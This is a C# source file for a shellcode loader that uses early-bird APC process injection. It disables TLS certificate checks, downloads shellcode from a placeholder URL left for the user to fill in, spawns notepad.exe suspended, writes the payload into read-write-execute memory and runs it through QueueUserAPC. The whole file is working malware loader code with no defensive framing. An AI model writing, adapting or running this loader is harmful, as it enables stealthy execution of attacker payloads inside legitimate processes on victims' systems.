using System;
using System.Net;
using System.Runtime.InteropServices;

class Hollow {
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, 
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, 
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, 
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
        byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
    
    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    static void Main(string[] args) {
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
        
        WebClient wc = new WebClient();
        byte[] shellcode = wc.DownloadData("http://--yourhstedDOTbinfile");
        
        STARTUPINFO si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
        PROCESS_INFORMATION pi;
        
        CreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, 
            false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
        
        IntPtr allocMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 
            0x1000 | 0x2000, 0x40);
        
        WriteProcessMemory(pi.hProcess, allocMem, shellcode, (uint)shellcode.Length, out _);
        
        QueueUserAPC(allocMem, pi.hThread, IntPtr.Zero);
        
        ResumeThread(pi.hThread);
    }
}
